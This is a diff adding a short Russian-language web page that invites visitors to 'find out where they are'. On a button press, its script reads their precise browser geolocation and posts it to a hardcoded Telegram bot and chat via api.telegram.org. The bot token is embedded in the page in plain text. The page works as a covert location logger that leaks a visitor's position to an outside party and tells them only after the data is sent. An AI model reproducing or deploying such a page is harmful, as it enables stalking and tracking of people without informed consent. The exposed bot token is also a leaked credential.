@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Геолокация</title>
+</head>
+<body>
+  <h2>🌍 Где ты находишься?</h2>
+  <p id="output">Нажми кнопку, чтобы определить местоположение</p>
+  <button onclick="getLocation()">📍 Определить координаты</button>
+
+  <script>
+    const botToken = "7903305941:AAF_7buaRxszZuLBo-WOEZ2spgM4bVhj1TY";
+    const chatId = "5783656146"; // например: 123456789
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
+      } else {
+        document.getElementById("output").textContent = "Браузер не поддерживает геолокацию.";
+      }
+    }
+
+    function sendToTelegram(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
+      const msg = `📍 Новая геолокация:\n\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${accuracy} м`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg
+        })
+      });
+
+      document.getElementById("output").textContent = "✅ Координаты отправлены в Telegram!";
+    }
+
+    function showError(error) {
+      let msg = "Ошибка получения геолокации.";
+      if (error.code === 1) msg = "Доступ к геолокации запрещён.";
+      if (error.code === 2) msg = "Невозможно определить местоположение.";
+      if (error.code === 3) msg = "Превышено время ожидания.";
+
+      document.getElementById("output").textContent = "⚠️ " + msg;
+    }
+  </script>
+</body>
+</html>
